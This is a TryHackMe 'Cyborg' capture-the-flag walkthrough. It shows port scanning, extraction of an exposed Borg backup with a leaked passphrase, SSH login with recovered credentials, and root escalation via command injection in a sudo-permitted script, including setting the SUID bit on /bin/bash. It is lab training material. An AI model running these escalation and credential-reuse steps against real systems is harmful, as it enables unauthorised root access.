---
title: 'TryHackMe - Cyborg'
author: r2cook
categories: [TryHackMe]
tags: [ssh, rsa, borg, PrivEsc]
render_with_liquid: false
media_subpath: /images/thm/Cyborg/
image:
  path: room_card.jpeg
---

> In this walkthrough, we compromise the TryHackMe **Cyborg** machine by chaining **web enumeration, exposed backup analysis, credential recovery, secure-shell foothold acquisition, and sudo-based Linux privilege escalation**, progressing from hidden archive discovery to full root compromise while capturing both flags.

## Initial Setup

Add the target to your hosts file:

```shell
echo "10.128.167.48 cyborg.thm" | sudo tee -a /etc/hosts
```
{: .nolineno }

---

## Enumeration

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt cyborg.thm
```
{: .nolineno }

### Results

```text
22/tcp open  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
```

### Key Findings

- **SSH (22)** available for later authenticated access
    
- **HTTP (80)** exposes the default Apache page initially
    
- Hidden content is likely present and worth enumerating
    

---

## Web Enumeration

The web portal initially shows the default Apache page, but further browsing reveals interesting hidden content.

![](Image_1.png){: width="800" height="400" .shadow }
![](Image_2.png){: width="800" height="400" .shadow }
![](Image_3.png){: width="800" height="400" .shadow }
![](Image_4.png){: width="800" height="400" .shadow }
![](Image_5.png){: width="800" height="400" .shadow }
![](Image_6.png){: width="800" height="400" .shadow }
![](Image_7.png){: width="800" height="400" .shadow }


A critical discovery from the exposed content is:

```text
squidward (music_archive)
```

This strongly suggests:

- `squidward` = backup passphrase
    
- `music_archive` = Borg archive name
    

---

## Borg Repository Analysis

The exposed files include a full Borg repository structure:

```text
README
config
data/
hints.5
index.5
integrity.5
nonce
```

The `README` confirms:

```text
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

This is highly valuable because Borg repositories can be **listed and extracted offline** if the passphrase is known.

---

## Extract the Backup

First list available archives:

```shell
borg list /path/to/repo
```
{: .nolineno }

This reveals:

```text
music_archive
```

Now extract it:

```shell
borg extract /path/to/repo::music_archive
```
{: .nolineno }

Use the discovered passphrase:

```text
squidward
```

---

## Credential Discovery → Initial Access

After extraction, navigate into the restored files:

```shell
cat home/alex/Documents/note.txt
```
{: .nolineno }

Contents:

```text
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

These are valid SSH credentials.

Login as Alex:

```shell
ssh alex@cyborg.thm
```
{: .nolineno }

Retrieve the user flag:

```shell
cat ~/user.txt
```
{: .nolineno }

---

# Privilege Escalation (PrivEsc)

Check sudo permissions:

```shell
sudo -l
```
{: .nolineno }

Output:

```text
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

This script is our privilege escalation vector.

---

## Vulnerability Analysis — backup.sh

The vulnerable logic:

```shell
while getopts c: flag
do
    case "${flag}" in
        c) command=${OPTARG};;
    esac
done
```
{: .nolineno }

Later in the script:

```shell
cmd=$($command)
echo $cmd
```
{: .nolineno }

This means any command supplied via `-c` is executed directly.

Since the script is runnable with **sudo as root**, this becomes a **root command injection vulnerability**.

---

## Exploitation

Verify execution context:

```shell
sudo /etc/mp3backups/backup.sh -c "whoami"
```
{: .nolineno }

Output:

```text
root
```

Perfect — arbitrary commands now execute as root.

---

## Root Shell

Set the SUID bit on bash:

```shell
sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
```
{: .nolineno }

Spawn privileged shell:

```shell
bash -p
```
{: .nolineno }

Verify:

```shell
whoami
```
{: .nolineno }

```text
root
```

Read root flag:

```shell
cat /root/root.txt
```
{: .nolineno }

---